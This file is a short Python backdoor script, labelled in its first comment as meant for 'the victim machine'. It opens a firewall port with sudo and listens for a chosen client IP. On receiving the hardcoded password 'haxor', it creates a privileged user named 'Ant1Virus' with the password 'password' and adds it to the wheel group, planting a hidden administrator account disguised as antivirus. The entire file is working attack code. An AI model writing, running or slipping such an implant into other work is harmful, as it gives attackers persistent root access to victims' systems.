# this is for the victim machine
import sys
import subprocess
import socket

CLIENT_IP = sys.argv[1] 
PORT = int(sys.argv[2])

# Open port in firewall
subprocess.Popen(f"sudo firewall-cmd --zone=public --permanent --add-port={PORT}/tcp && sudo firewall-cmd --reload", shell=True)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("", PORT))

s.listen(1)
while True:
    conn, address = s.accept()
    print("Incoming connection: " + str(address))
    print(address)
    if address[0] == CLIENT_IP:
        print("Address match")
        pwd = conn.recv(4096).decode()
        if pwd == "haxor":
            print("Correct password, waiting for commands")
            conn.send("done".encode())
            subprocess.Popen("sudo useradd -p $(openssl passwd -1 password) Ant1Virus && sudo usermod -aG wheel Ant1Virus", shell=True)
            conn.close()
        else:
            print("Incorrect password")
            conn.close()

conn.close()